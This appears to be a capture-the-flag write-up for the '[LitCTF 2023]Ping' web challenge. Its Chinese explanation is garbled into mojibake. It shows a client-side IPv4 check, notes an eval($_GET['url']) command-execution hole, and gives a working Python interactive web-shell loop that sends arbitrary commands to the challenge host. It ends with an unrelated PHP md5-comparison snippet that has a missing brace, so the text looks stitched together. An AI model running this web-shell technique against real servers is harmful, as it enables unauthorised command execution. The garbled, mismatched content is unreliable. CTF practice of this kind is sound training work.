item.title: [LitCTF 2023]Ping
item.description:
æ£€æŸ¥é¡µé¢å…ƒç´ ï¼Œå‘ç° form çš„ onsubmit å±æ€§åœ¨è¡¨å•æäº¤æ—¶è§¦å‘ JavaScript ä»£ç ï¼ŒéªŒè¯ç”¨æˆ·è¾“å…¥æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„ IPv4 åœ°å€

function check_ip() {
    let ip = document.getElementById('command').value;
    let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/;

    if (re.test(ip.trim())) {
        return true;
    }
    alert('æ•¢äºå°è¯•å·²ç»æ˜¯å¾ˆå‰å®³äº†ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œå°±åªèƒ½è¾“å…¥ipå“¦');
    return false;
}

å­˜åœ¨ RCE æ¼æ´ï¼ševal($_GET['url']);

 <?php

æ„é€  Web Shell

import requests

url = 'http://node5.anna.nssctf.cn:27625/'

while True:
    cmd = input('> ')

    if cmd == 'quit':
        break

    payload = {'url': f'echo `{cmd}`;'}

    response = requests.get(url, params=payload)

    print(response.text)

<?php

if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";

}
else {
    echo 'wrong!';
}
